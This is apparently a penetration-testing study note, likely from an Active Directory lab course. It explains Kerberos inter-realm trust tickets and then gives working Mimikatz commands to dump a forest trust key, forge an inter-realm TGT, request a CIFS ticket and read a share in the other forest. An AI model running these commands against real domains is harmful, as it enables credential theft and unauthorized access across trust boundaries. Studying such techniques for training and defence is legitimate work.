**Scenario:** We want to access Application Server across the trust boundary 

1. Request TGT
2. Recieve TGT
3. Show TGT, Req TGS
4. Recieve inter-realm TGT (As soon as DC finds that user trying to access service across the forest)
5. Presents that Inver-realm TGT to target DC and *if it can decrypt it using TRUST KEY* then it is well and good just like krbtgt hash 
6. Response with TGS and we can access according to our privileges.


|Ticket|Varification/Requirement|
|--|--|
|Golden Ticket|KRBTGT hash|
|Silver Ticket|NTLM hash of the service account|
|Inter-Realm TGT|Trust Key|

#### Exploitation
- Across Forests
- We require the trust key for the inter-forest trust.
	`Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
	or
	`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
	*We will identify the external trusted forest by its NetBIOS name*

So we have trusted key and now create a ticket:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:<TRUST_KEY> /service:krbtgt /target:<CROSS_FOREST_DOMAIN EX: EURPCORP.local> /ticket:<OUTPUT_LOCATION>"'

# Now we can request a TGS by presenting this TGT

.\asktgs.exe <LOCATION_to_TGT.kirbi> CIFS/eurocorp-dc.eurocorp.local

# list the tickets
klist

# Access something that is explicitly shared with user of TGT user
ls \\eurpcorp-dc.eurocorp.local\SharedwithDCorp\
```
